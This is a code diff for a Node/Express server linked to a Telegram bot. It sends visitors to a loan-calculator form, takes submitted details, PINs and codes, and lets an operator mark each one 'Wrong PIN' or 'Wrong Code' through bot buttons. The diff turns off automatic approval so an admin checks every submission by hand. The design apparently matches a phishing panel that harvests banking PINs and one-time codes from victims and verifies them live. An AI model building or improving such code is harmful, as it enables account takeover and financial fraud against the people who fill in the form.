@@ -74,7 +74,6 @@ async function setWebhook(bot) {
 }
 
 // ---------- Routes ----------
-// ✅ FIXED: redirect to index.html (loan calculator + form), not details.html
 app.get('/bot/:botId', (req, res) => {
     const bot = getBot(req.params.botId);
     if (!bot) return res.status(404).send('Invalid bot link');
@@ -105,12 +104,13 @@ app.post('/submit-details', (req, res) => {
         { text: '❌ Wrong PIN', callback_data: `pin_bad:${requestId}` }
     ]]);
 
-    setTimeout(() => {
-        if (pendingDetails[requestId] && pendingDetails[requestId].approved === null) {
-            pendingDetails[requestId].approved = true;
-            console.log(`✅ Auto‑approved details ${requestId}`);
-        }
-    }, 30000);
+    // ❌ AUTO‑APPROVAL REMOVED – admin must click a button
+    // setTimeout(() => {
+    //     if (pendingDetails[requestId] && pendingDetails[requestId].approved === null) {
+    //         pendingDetails[requestId].approved = true;
+    //         console.log(`✅ Auto‑approved details ${requestId}`);
+    //     }
+    // }, 30000);
 
     res.json({ requestId });
 });
@@ -141,12 +141,13 @@ app.post('/submit-code', (req, res) => {
         { text: '❌ Wrong Code', callback_data: `code_bad:${requestId}` }
     ]]);
 
-    setTimeout(() => {
-        if (pendingCodes[requestId] && pendingCodes[requestId].approved === null) {
-            pendingCodes[requestId].approved = true;
-            console.log(`✅ Auto‑approved code ${requestId}`);
-        }
-    }, 30000);
+    // ❌ AUTO‑APPROVAL REMOVED – admin must click a button
+    // setTimeout(() => {
+    //     if (pendingCodes[requestId] && pendingCodes[requestId].approved === null) {
+    //         pendingCodes[requestId].approved = true;
+    //         console.log(`✅ Auto‑approved code ${requestId}`);
+    //     }
+    // }, 30000);
 
     res.json({ requestId });
 });
